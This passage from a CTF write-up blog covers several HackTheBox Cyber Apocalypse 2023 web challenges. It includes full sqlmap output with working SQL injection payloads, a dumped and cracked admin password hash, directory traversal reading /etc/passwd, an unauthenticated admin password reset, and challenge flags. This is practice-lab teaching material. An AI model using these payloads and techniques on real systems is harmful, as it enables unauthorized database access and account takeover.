UNION query (NULL) - 21 to 40 columns\u0026#39; [19:27:09] [INFO] testing \u0026#39;MySQL UNION query (random number) - 21 to 40 columns\u0026#39; [19:27:12] [INFO] testing \u0026#39;MySQL UNION query (NULL) - 41 to 60 columns\u0026#39; [19:27:15] [INFO] testing \u0026#39;MySQL UNION query (random number) - 41 to 60 columns\u0026#39; [19:27:18] [INFO] testing \u0026#39;MySQL UNION query (NULL) - 61 to 80 columns\u0026#39; [19:27:21] [INFO] testing \u0026#39;MySQL UNION query (random number) - 61 to 80 columns\u0026#39; [19:27:24] [INFO] testing \u0026#39;MySQL UNION query (NULL) - 81 to 100 columns\u0026#39; [19:27:27] [INFO] testing \u0026#39;MySQL UNION query (random number) - 81 to 100 columns\u0026#39; (custom) POST parameter \u0026#39;JSON username\u0026#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] n sqlmap identified the following injection point(s) with a total of 1397 HTTP(s) requests: --- Parameter: JSON username ((custom) POST) Type: error-based Title: MySQL \u0026gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: {\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34; AND (SELECT 2242 FROM(SELECT COUNT(*),CONCAT(0x71716a6a71,(SELECT (ELT(2242=2242,1))),0x71626b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IPSK\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;password\u0026#34;} Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: {\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34; AND (SELECT 4429 FROM (SELECT(SLEEP(5)))Llei)-- Mhzj\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;password\u0026#34;} --- [19:27:44] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL \u0026gt;= 5.0 (MariaDB fork) [19:27:44] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries [19:27:44] [INFO] fetching current database [19:27:45] [INFO] retrieved: \u0026#39;orbital\u0026#39; [19:27:45] [INFO] fetching tables for database: \u0026#39;orbital\u0026#39; [19:27:45] [INFO] retrieved: \u0026#39;communication\u0026#39; [19:27:45] [INFO] retrieved: \u0026#39;users\u0026#39; [19:27:45] [INFO] fetching columns for table \u0026#39;users\u0026#39; in database \u0026#39;orbital\u0026#39; [19:27:45] [INFO] retrieved: \u0026#39;id\u0026#39; [19:27:46] [INFO] retrieved: \u0026#39;int(11)\u0026#39; [19:27:46] [INFO] retrieved: \u0026#39;username\u0026#39; [19:27:46] [INFO] retrieved: \u0026#39;varchar(255)\u0026#39; [19:27:46] [INFO] retrieved: \u0026#39;password\u0026#39; [19:27:46] [INFO] retrieved: \u0026#39;varchar(255)\u0026#39; [19:27:46] [INFO] fetching entries for table \u0026#39;users\u0026#39; in database \u0026#39;orbital\u0026#39; [19:27:46] [INFO] retrieved: \u0026#39;1\u0026#39; [19:27:47] [INFO] retrieved: \u0026#39;1692b753c031f2905b89e7258dbc49bb\u0026#39; [19:27:47] [INFO] retrieved: \u0026#39;admin\u0026#39; [19:27:47] [INFO] recognized possible password hashes in column \u0026#39;password\u0026#39; do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y [19:28:10] [INFO] writing hashes to a temporary file \u0026#39;/tmp/sqlmapxmrfdr0m9619/sqlmaphashes-xvcfw_me.txt\u0026#39; do you want to crack them via a dictionary-based attack? [Y/n/q] y [19:28:13] [INFO] using hash method \u0026#39;md5_generic_passwd\u0026#39; what dictionary do you want to use? [1] default dictionary file \u0026#39;/usr/share/sqlmap/data/txt/wordlist.tx_\u0026#39; (press Enter) [2] custom dictionary file [3] file with list of dictionary files \u0026gt; 1 [19:28:17] [INFO] using default dictionary do you want to use common password suffixes? (slow!) [y/N] n [19:28:23] [INFO] starting dictionary-based cracking (md5_generic_passwd) [19:28:23] [INFO] starting 2 processes [19:28:33] [INFO] cracked password \u0026#39;ichliebedich\u0026#39; for user \u0026#39;admin\u0026#39; Database: orbital Table: users [1 entry] +----+-------------------------------------------------+----------+ | id | password | username | +----+-------------------------------------------------+----------+ | 1 | 1692b753c031f2905b89e7258dbc49bb (ichliebedich) | admin | +----+-------------------------------------------------+----------+ [19:28:55] [INFO] table \u0026#39;orbital.users\u0026#39; dumped to CSV file \u0026#39;/home/kali/.local/share/sqlmap/output/68.183.45.143/dump/orbital/users.csv\u0026#39; [19:28:55] [INFO] fetching columns for table \u0026#39;communication\u0026#39; in database \u0026#39;orbital\u0026#39; [19:28:55] [INFO] retrieved: \u0026#39;id\u0026#39; [19:28:55] [INFO] retrieved: \u0026#39;int(11)\u0026#39; [19:28:55] [INFO] retrieved: \u0026#39;source\u0026#39; [19:28:56] [INFO] retrieved: \u0026#39;varchar(255)\u0026#39; [19:28:56] [INFO] retrieved: \u0026#39;destination\u0026#39; [19:28:56] [INFO] retrieved: \u0026#39;varchar(255)\u0026#39; [19:28:56] [INFO] retrieved: \u0026#39;name\u0026#39; [19:28:56] [INFO] retrieved: \u0026#39;varchar(255)\u0026#39; [19:28:56] [INFO] retrieved: \u0026#39;downloadable\u0026#39; [19:28:57] [INFO] retrieved: \u0026#39;varchar(255)\u0026#39; [19:28:57] [INFO] fetching entries for table \u0026#39;communication\u0026#39; in database \u0026#39;orbital\u0026#39; [19:28:57] [INFO] retrieved: \u0026#39;Arcturus\u0026#39; [19:28:57] [INFO] retrieved: \u0026#39;communication.mp3\u0026#39; [19:28:57] [INFO] retrieved: \u0026#39;1\u0026#39; [19:28:57] [INFO] retrieved: \u0026#39;Ice World Calling Red Giant\u0026#39; [19:28:57] [INFO] retrieved: \u0026#39;Titan\u0026#39; [19:28:58] [INFO] retrieved: \u0026#39;Vega\u0026#39; [19:28:58] [INFO] retrieved: \u0026#39;communication.mp3\u0026#39; [19:28:58] [INFO] retrieved: \u0026#39;2\u0026#39; [19:28:58] [INFO] retrieved: \u0026#39;Spiral Arm Salutations\u0026#39; [19:28:58] [INFO] retrieved: \u0026#39;Andromeda\u0026#39; [19:28:58] [INFO] retrieved: \u0026#39;Trappist-1\u0026#39; [19:28:58] [INFO] retrieved: \u0026#39;communication.mp3\u0026#39; [19:28:59] [INFO] retrieved: \u0026#39;3\u0026#39; [19:28:59] [INFO] retrieved: \u0026#39;Lone Star Linkup\u0026#39; [19:28:59] [INFO] retrieved: \u0026#39;Proxima Centauri\u0026#39; [19:28:59] [INFO] retrieved: \u0026#39;Kepler-438b\u0026#39; [19:28:59] [INFO] retrieved: \u0026#39;communication.mp3\u0026#39; [19:29:00] [INFO] retrieved: \u0026#39;4\u0026#39; [19:29:00] [INFO] retrieved: \u0026#39;Small World Symposium\u0026#39; [19:29:00] [INFO] retrieved: \u0026#39;TRAPPIST-1h\u0026#39; [19:29:00] [INFO] retrieved: \u0026#39;Boop\u0026#39; [19:29:00] [INFO] retrieved: \u0026#39;communication.mp3\u0026#39; [19:29:00] [INFO] retrieved: \u0026#39;5\u0026#39; [19:29:00] [INFO] retrieved: \u0026#39;Jelly World Japes\u0026#39; [19:29:01] [INFO] retrieved: \u0026#39;Winky\u0026#39; Database: orbital Table: communication [5 entries] +----+-----------------------------+------------------+-------------+-------------------+ | id | name | source | destination | downloadable | +----+-----------------------------+------------------+-------------+-------------------+ | 1 | Ice World Calling Red Giant | Titan | Arcturus | communication.mp3 | | 2 | Spiral Arm Salutations | Andromeda | Vega | communication.mp3 | | 3 | Lone Star Linkup | Proxima Centauri | Trappist-1 | communication.mp3 | | 4 | Small World Symposium | TRAPPIST-1h | Kepler-438b | communication.mp3 | | 5 | Jelly World Japes | Winky | Boop | communication.mp3 | +----+-----------------------------+------------------+-------------+-------------------+ [19:29:01] [INFO] table \u0026#39;orbital.communication\u0026#39; dumped to CSV file \u0026#39;/home/kali/.local/share/sqlmap/output/68.183.45.143/dump/orbital/communication.csv\u0026#39; [19:29:01] [WARNING] HTTP error codes detected during run: 403 (Forbidden) - 913 times, 500 (Internal Server Error) - 546 times [19:29:01] [INFO] fetched data logged to text files under \u0026#39;/home/kali/.local/share/sqlmap/output/68.183.45.143\u0026#39; [*] ending @ 19:29:01 /2023-03-20/ Running sqlmap quickly picked up the proper payload to use for SQL injection. The payload utilized:\n1 Payload: {\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34; AND (SELECT 4429 FROM (SELECT(SLEEP(5)))Llei)-- Mhzj\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;password\u0026#34;} And fortunately with this, sqlmap is able to grab admin\u0026rsquo;s password from the database. The login credentials are as follows:\n1 {\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;ichliebedich\u0026#34;} Using these credentials gets us in.\nNow that we are in, we can see a lot of static information on this page but no flag in plain sight. At the bottom of the page, we see an export option that will prompt us to download a communication.mp3 file. We saw some information on an export page in the source code, so let\u0026rsquo;s revisit this to get a better idea on what\u0026rsquo;s going on. In blueprints/test.py:\n1 2 3 4 5 6 7 8 9 10 11 12 def exportFile(): if not request.is_json: return response(\u0026#39;Invalid JSON!\u0026#39;), 400 data = request.get_json() communicationName = data.get(\u0026#39;name\u0026#39;, \u0026#39;\u0026#39;) try: # Everyone is saying I should escape specific characters in the filename. I don\u0026#39;t know why. return send_file(f\u0026#39;/communications/{communicationName}\u0026#39;, as_attachment=True) except: return response(\u0026#39;Unable to retrieve the communication\u0026#39;), 400 We see there is a lack of sanitization on how it is grabbing the file to export. If we can edit the file name we are requesting, we can perform directory traversal to grab any file that is not read-protected. To check this, we will look for the always-readable /etc/passwd. In burpsuite: Request\nResponse\nWe see the contents of /etc/passwd. Now all that remains is to find the flag. After making several guesses on where the flag might be located, we have yet to find the flag. Back to the source code, perhaps we can see how it is being placed upon initialization by viewing the Dockerfile:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 $ cat Dockerfile FROM python:3.8-alpine # Install packages RUN apk add --no-cache --update mariadb mariadb-client supervisor gcc musl-dev mariadb-connector-c-dev # Upgrade pip RUN python -m pip install --upgrade pip # Install dependencies RUN pip install Flask flask_mysqldb pyjwt colorama # Setup app RUN mkdir -p /app RUN mkdir -p /communication # Switch working environment WORKDIR /app # Add application COPY challenge . # Setup supervisor COPY config/supervisord.conf /etc/supervisord.conf # Expose port the server is reachable on EXPOSE 1337 # Disable pycache ENV PYTHONDONTWRITEBYTECODE=1 # copy flag COPY flag.txt /signal_sleuth_firmware COPY files /communications/ # create database and start supervisord COPY --chown=root entrypoint.sh /entrypoint.sh RUN chmod +x /entrypoint.sh ENTRYPOINT [\u0026#34;/entrypoint.sh\u0026#34;] They did indeed pull a cheeky one on us, note how the flag.txt has been renamed! In this machine it\u0026rsquo;s now called signal_sleuth_firmware In Burpsuite: Request:\nResponse:\nFlag HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}\nPassman Pandora discovered the presence of a mole within the ministry. To proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager. Can you hack into the password manager? Difficulty: easy\nVisiting the page we are greeted with a login page. We are also presented with the option to create an account. After guessing a few times for user admin, I decide to create a user. Trying username admin results in an error, telling us this username is in use. Good to note; for now we will create user a. Registering as user a was successful, and now we see a page where we might submit and store passwords for given addresses. This page operates as a password manager, true to the challenge description and title. A brief check at XSS fails, so let\u0026rsquo;s explore the provided source code. Interestingly, the database.js file shows us more request options than we might have expected. In particular, there is an option to update passwords:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 async updatePassword(username, password) { return new Promise(async (resolve, reject) =\u0026gt; { let stmt = `UPDATE users SET password = ? WHERE username = ?`; this.connection.query( stmt, [ String(password), String(username) ], (err, _) =\u0026gt; { if(err) reject(err) resolve(); } ) }); } There is no authorization verification here, so perhaps if we can request to change the password of user admin, we can login as admin. Starting with a post request to register a new user:\nRevised post request:\nResponse:\nWe have updated the admin password successfully, or so it says. When we attempt to login as admin, we are successful! The flag is given in the password field of admin\u0026rsquo;s saved passwords.\nHTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}\nTrapped Source Intergalactic Ministry of Spies tested Pandora\u0026rsquo;s movement and intelligence abilities. She found herself locked in a room with no apparent means of escape. Her task was to unlock the door and make her way out. Can you help her in opening the door? Difficutly: very easy\nUpon visiting the given address, we see a locked keypad: There is not much going on with the page, so we can check the page source with CTRL+U.\nIn the source code, we see the correct pin:\n1 2 3 4 5 6 7 8 9 \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; window.CONFIG = window.CONFIG || { buildNumber: \u0026#34;v20190816\u0026#34;, debug: false, modelName: \u0026#34;Valencia\u0026#34;, correctPin: \u0026#34;8291\u0026#34;, } \u0026lt;/script\u0026gt; Just like that, the flag is given:\nHowever, we cannot highlight for easy copy paste. We will inspect the object. Right clicking over the flag, we can Inspect, and the flag is in text:\nFrom here we can right click and \u0026ldquo;copy inner HTML\u0026rdquo;. Now we have the flag to paste easy, and guaranteed free from spelling errors.\nHTB{V13w_50urc3_c4n_b3_u53ful!!!}\n","date":"2023-03-25T19:01:05-05:00","permalink":"https://yuwenmichael.netlify.app/post/hackthebox_cyber_apocalypse_2023/","title":"HackTheBox_Cyber_Apocalypse_2023"}]